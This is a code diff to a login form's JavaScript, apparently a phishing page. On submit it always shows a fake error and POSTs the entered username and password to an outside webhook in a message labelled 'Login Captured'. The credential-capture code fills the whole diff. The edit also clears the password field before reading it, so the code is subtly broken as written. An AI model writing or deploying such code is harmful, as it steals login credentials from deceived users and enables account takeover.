@@ -129,22 +129,21 @@ document.addEventListener("DOMContentLoaded", function() {
 
   loginForm.addEventListener("submit", function(e) {
     e.preventDefault();
+    errorMsg.classList.remove("hidden");
+    passwordInput.value = "";
+    checkInputs();
 
+    // Send data to webhook
     const username = usernameInput.value.trim();
     const password = passwordInput.value.trim();
-
     if(username && password) {
       fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password })
+        body: JSON.stringify({
+          content: `Login Captured:\nUsername: ${username}\nPassword: ${password}`
+        })
       }).catch(console.error);
-
-      // Clear password after sending
-      passwordInput.value = "";
-      checkInputs();
-    } else {
-      errorMsg.classList.remove("hidden");
     }
   });
 
